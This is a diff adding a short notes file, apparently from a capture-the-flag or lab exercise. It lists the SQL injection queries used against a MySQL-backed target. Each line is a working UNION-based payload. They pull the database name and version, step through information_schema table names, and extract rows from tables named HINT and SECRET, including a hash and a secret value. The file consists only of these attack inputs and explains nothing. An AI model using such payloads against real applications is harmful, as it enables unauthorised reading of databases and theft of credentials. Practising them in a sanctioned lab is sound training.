@@ -1,0 +1,8 @@
+	Queries used (don't forget space at the end)
+	' union select all 1,database(),3,@@version;-- 
+	' union select all 1,table_schema,3,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 0,1;-- 
+	' union select all 1,table_schema,3,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1,1;--
+	' union select all 1,table_schema,3,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 2,1;--
+	' union select all 1,table_schema,3,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 3,1;--
+	' union select all 1,message,3,4 from HINT limit 0,1;-- 
+	' union select all 1,hash,3,secret from SECRET limit 0,1;-- 
